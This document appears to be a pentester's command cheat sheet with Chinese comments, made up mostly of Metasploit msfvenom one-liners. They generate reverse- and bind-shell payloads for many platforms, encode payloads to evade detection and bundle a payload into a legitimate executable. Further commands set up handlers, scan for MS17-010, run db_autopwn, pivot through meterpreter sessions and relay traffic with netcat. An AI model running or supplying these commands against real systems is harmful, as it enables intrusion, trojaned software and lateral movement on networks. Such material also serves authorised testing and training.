#########################
#######  msfvenom  ######
#########################

###普通生成
msfvenom -p <payload> <payload options> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
###编码处理型
msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
###捆绑
Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\nomal.exe –k –f exe –o C:\shell.exe
###Windows
Msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
Msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe
###Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
###MAC
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
###PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
###Asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
###Aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
###JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
###War
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
###Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw > shell.sh
###Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
###Python
msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

#postgres
psql postgres://username:password@host:port/dbname  
psql -U username -h hostname -p port -d dbname 
psql -U postgres


msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=192.168.232.145 LPORT=8888 -f exe -o payload_rev.exe
msfvenom -l payloads |grep linux |grep /meterpreter/reverse_tcp
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.232.145 LPORT=8888 -f elf -o payload_rev.elf

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 8888
show options
run

set ExitOnSession false
exploit -j -z

#生成一个正向的执行文件
msfvenom -p windows/meterpreter/bind_tcp -a x86 RHOST=0.0.0.0 RPORT=9999 -f exe -o payload.exe
msfvenom -l payloads |grep linux |grep /meterpreter/bind_tcp
msfvenom -p linux/x86/meterpreter/bind_tcp -a x86 RHOST=0.0.0.0 RPORT=9999 -f elf -o payload.elf

use auxiliary/scanner/smb/smb_ms17_010
#指定读取的目标文件
set rhosts file:/root/pentest/10-all.txt
set threads 10
spool ms17-010.txt         # 输出记录写入到文件
msfconsole -r phphandler.rc

#db_autopwn
load db_autopwn
db_nmap -O 192.168.232.144
db_autopwn -p -t -e
session -i
#/usr/share/metasploit-framework/plugins

#反弹10.1.1.129端口3389到本地2222并监听那么可以使用如下方法
portfwd add -l 2222 -r 192.168.232.144 -p 3389
netstat -an | grep "2222"
rdesktop 127.1.1.0:2222

#pivot是meterpreter最常用的一种代理
route -4	route print	
在metasploit添加一个路由表，目的是访问10.1.1.129将通过meterpreter的会话 1 来访问
route add 10.1.1.129 255.255.255.255 1

#代理10.1.1.129/24 到session 1		
#sessions -l		sessions -i 1
route add 192.168.232.0 255.255.255.0 1


#8888 -> 8889	80 -> 8888 -> 8889
while :; do  nc -l -p 8888; done
nc -l -p 8888
cat /tmp/fifo | nc localhost 80 | nc -l 8889 > /tmp/fifo
ncat 192.168.56.1 8889


searchspoit linux 2.6 ubuntu priv esc

